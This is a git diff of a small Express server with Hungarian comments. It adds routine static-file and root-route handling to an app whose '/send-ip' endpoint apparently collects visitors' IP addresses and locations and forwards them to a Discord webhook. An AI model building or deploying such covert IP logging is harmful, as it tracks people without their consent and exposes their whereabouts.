@@ -2,6 +2,7 @@ require('dotenv').config(); // Betöltjük a .env fájlban lévő változókat
 
 const express = require('express');
 const axios = require('axios');
+const path = require('path');
 const app = express();
 const port = process.env.PORT || 3000;
 
@@ -9,7 +10,7 @@ const port = process.env.PORT || 3000;
 const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
 
 // Statikus fájlok kiszolgálása
-app.use(express.static('public'));
+app.use(express.static(path.join(__dirname, 'public')));
 
 // IP cím és hely információ küldése a Discordra
 app.get('/send-ip', (req, res) => {
@@ -46,6 +47,11 @@ app.get('/send-ip', (req, res) => {
         .catch(error => {
             res.send('Hiba történt az IP cím lekérdezésekor!');
         });
+});
+
+// Alapértelmezett route, amely a gyökér URL-ről a 'index.html'-t szolgáltatja ki
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 // Szerver indítása
